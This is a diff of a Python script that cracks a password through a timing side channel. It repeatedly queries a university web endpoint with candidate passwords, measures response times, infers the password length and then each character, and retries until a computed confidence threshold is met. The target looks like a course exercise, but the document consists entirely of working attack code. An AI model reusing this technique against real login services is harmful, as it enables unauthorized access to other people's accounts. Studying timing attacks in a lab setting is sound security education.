@@ -10,10 +10,10 @@ import numpy as np
 
 # Some constant definitions
 URL = "http://aoi.ise.bgu.ac.il"
-USER_NAME = "mosho"
 ATTEMPTS_PER_LETTER = 5
-ATTEMPTS_PER_PASSWORD_LEN = 2  # For guessing the password length
+ATTEMPTS_PER_PASSWORD_LEN = 5  # For guessing the password length
 MAX_PASSWORD_LEN = 32
+REQUIRED_CONFIDENCE = 0.2
 
 
 class PasswordFound(Exception):
@@ -29,9 +29,6 @@ def eprint(*args, **kwargs):
     """
     Print to stderr
     """
-    with open('logs.txt', 'a') as f:
-        print(*args, file=f, **kwargs)
-
     print(*args, file=sys.stderr, **kwargs)
 
 
@@ -51,20 +48,26 @@ def try_to_hack(username, password, difficulty):
             before = time.perf_counter()
             result = requests.get(URL, params={'user': username, 'password': password, 'difficulty': difficulty})
             after = time.perf_counter()
+
             # Raise the password immediately in case we discover it
             if result.content == b'1':
                 raise PasswordFound(password)
 
-            timings = np.append(timings, after-before)
-            # timings.append(after - before)
+            timings = np.append(timings, after - before)
+
         except ConnectionError:
+            # Ignore timeouts if occurs.. :\
             pass
 
     return timings
 
 
 def calc_statistics(timings):
-    # Calculate the statistics
+    """
+    Calculate statistics of series of requests timings
+    :param timings: timings (RTTs) of series of requests
+    :return: the median, min_timing, max_timing, average, stddev, percentile_10
+    """
     median = statistics.median(timings)
     min_timing = min(timings)
     max_timing = max(timings)
@@ -80,10 +83,12 @@ def choose_best(measures, top_k=3):
     sorted_measures = list(sorted(measures, key=itemgetter('percentile_10'), reverse=True))
 
     best_item = sorted_measures[0]
-    top_k_items = sorted_measures[1:top_k+1]
+    top_k_items = sorted_measures[1:top_k + 1]
 
     msg = "Best item -> Item: %s percentile_10: %s Median: %s Max: %s Min: %s Stddev: %s"
-    eprint(msg % (best_item['item'], best_item['percentile_10'], best_item['median'], best_item['max'], best_item['min'], best_item['stddev']))
+    eprint(msg % (
+        best_item['item'], best_item['percentile_10'], best_item['median'], best_item['max'], best_item['min'],
+        best_item['stddev']))
 
     eprint("\nFollowing characters were:")
 
@@ -96,6 +101,32 @@ def choose_best(measures, top_k=3):
     return best_item, top_k_items
 
 
+def compute_confidence(measures):
+    """
+    calculate the difference between best-second, and the second-last and return it
+    :return:
+    """
+    sorted_measures = list(sorted(measures, key=itemgetter('percentile_10'), reverse=True))
+
+    best_item = sorted_measures[0]['percentile_10']
+    second_place_item = sorted_measures[1]['percentile_10']
+    last_place_item = sorted_measures[-1]['percentile_10']
+
+    range_best_and_second_place = best_item - second_place_item
+    range_non_winners = second_place_item - last_place_item
+
+    percent_of_range = range_best_and_second_place / range_non_winners
+    final_confidence = percent_of_range / REQUIRED_CONFIDENCE
+
+    eprint(f"best_item({best_item}) - second_place_item({second_place_item}) = {range_best_and_second_place}")
+    eprint(f"second_place_item({second_place_item}) - last_place_item({last_place_item})= {range_non_winners}")
+    eprint(
+        f"{percent_of_range} = range_best_and_second_place({range_best_and_second_place}) / range_non_winners({range_non_winners})")
+    eprint(f"final_confidence({final_confidence}) = {percent_of_range} / {REQUIRED_CONFIDENCE}")
+
+    return final_confidence
+
+
 def find_next_character(username, base_known_password, password_length, difficulty):
     """
     Find the next character in the password from a base_known_password
@@ -105,33 +136,46 @@ def find_next_character(username, base_known_password, password_length, difficul
     :param difficulty: the difficulty level
     :return: the next character in the password
     """
-    measures = []  # statistics for each guess - min, max, median, stddev
+    final_confidence = 0
 
     eprint("Trying to find the character at position %s with prefix %r" % (
-    (len(base_known_password) + 1), base_known_password))
+        (len(base_known_password) + 1), base_known_password))
 
-    # If stddev>1 there is a peak in the traffic, so start again
-    is_stddev_gt_one = True
-    while is_stddev_gt_one:
-        for _, character in enumerate(string.ascii_lowercase):
-            next_guess_password = base_known_password + character + "0" * (password_length - len(base_known_password) - 1)
+    # should be at least >=1
+    while final_confidence < 1:
+        # If stddev>1 there is a peak in the traffic, so start again
+        is_stddev_gt_one = True
+        while is_stddev_gt_one:
+            measures = []  # statistics for each guess
+            for _, character in enumerate(string.ascii_lowercase):
+                next_guess_password = base_known_password + character + "0" * (
+                        password_length - len(base_known_password) - 1)
 
-            timings = try_to_hack(username, next_guess_password, difficulty)
+                timings = try_to_hack(username, next_guess_password, difficulty)
 
-            # Calculate the statistics
-            median, min_timing, max_timing, average, stddev, percentile_10 = calc_statistics(timings)
+                # Calculate the statistics
+                median, min_timing, max_timing, average, stddev, percentile_10 = calc_statistics(timings)
 
-            is_stddev_gt_one = stddev > 1
-            if is_stddev_gt_one:
-                eprint(f"stddev={stddev} >1 for: {next_guess_password}, restart checking for this position...")
-                break  # and restart the loop (check again every letter in this position)
+                is_stddev_gt_one = stddev > 1
+                if is_stddev_gt_one:
+                    eprint(f"stddev={stddev} >1 for: {next_guess_password}, restart checking for this position...")
+                    break  # and restart the loop (check again every letter in this position)
 
-            measures.append({'item': character, 'percentile_10': percentile_10, 'median': median, 'min': min_timing,
-                             'max': max_timing, 'average': average, 'stddev': stddev})
+                measures.append({'item': character, 'percentile_10': percentile_10, 'median': median, 'min': min_timing,
+                                 'max': max_timing, 'average': average, 'stddev': stddev})
 
-            eprint(f'searching: {base_known_password + character + "0" * (password_length - len(base_known_password) - 1)}',
-                   {'character': character, 'attempts': len(timings), 'percentile_10': percentile_10, 'median': median, 'min': min_timing,
-                    'max': max_timing, 'average': average, 'stddev': stddev})
+                eprint(
+                    f'searching: {base_known_password + character + "0" * (password_length - len(base_known_password) - 1)}',
+                    {'character': character, 'attempts': len(timings), 'percentile_10': percentile_10, 'median': median,
+                     'min': min_timing,
+                     'max': max_timing, 'average': average, 'stddev': stddev})
+
+        # if 'confidence_lvl < 1' restart the loop (check again every letter in this position)
+        final_confidence = compute_confidence(measures)
+        if final_confidence < 1:
+            eprint(f"final_confidence={final_confidence} <1, restart checking for this position...")
+        else:
+            eprint(f"final_confidence={final_confidence} >=1, choosing best")
 
     found_character, top_characters = choose_best(measures)
 
@@ -145,7 +189,7 @@ def assume_password_length(username, difficulty):
     Assume the password length by calculating the avg. time it took for the response by the password length sent.
     :return:
     """
-    #times_by_len = {i: [] for i in range(1, MAX_PASSWORD_LEN + 1)}  # Initialize with 0
+    # times_by_len = {i: [] for i in range(1, MAX_PASSWORD_LEN + 1)}  # Initialize with 0
     measures = []
     for pass_length in range(1, MAX_PASSWORD_LEN + 1):
         timings = np.array([])
@@ -157,12 +201,13 @@ def assume_password_length(username, difficulty):
             _ = requests.get(URL, params={'user': username, 'password': characters, 'difficulty': difficulty})
             after = time.perf_counter()
 
-            timings = np.append(timings, after-before)
+            timings = np.append(timings, after - before)
 
         median, min_timing, max_timing, average, stddev, percentile_10 = calc_statistics(timings)
         measures.append({'item': pass_length, 'median': median, 'min': min_timing,
                          'max': max_timing, 'average': average, 'stddev': stddev, 'percentile_10': percentile_10})
-        eprint({'length': pass_length, 'attempts': len(timings), 'median': median, 'percentile_10': percentile_10, 'min': min_timing, 'max': max_timing, 'average': average, 'stddev': stddev})
+        eprint({'length': pass_length, 'attempts': len(timings), 'median': median, 'percentile_10': percentile_10,
+                'min': min_timing, 'max': max_timing, 'average': average, 'stddev': stddev})
 
     found_length, top_lengths = choose_best(measures)
 
@@ -183,6 +228,8 @@ def main():
     username = sys.argv[1]
     difficulty = sys.argv[2]
 
+    print("current username: " + str(username) + ", current difficulty: " + str(difficulty))
+
     # While not found
     while 1:
         eprint()
@@ -194,7 +241,6 @@ def main():
         password = ''
 
         password_length = assume_password_length(username, difficulty)
-        # password_length = 6
         eprint(f'The password assumed length: {password_length}\n')
 
         try:
@@ -213,4 +259,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
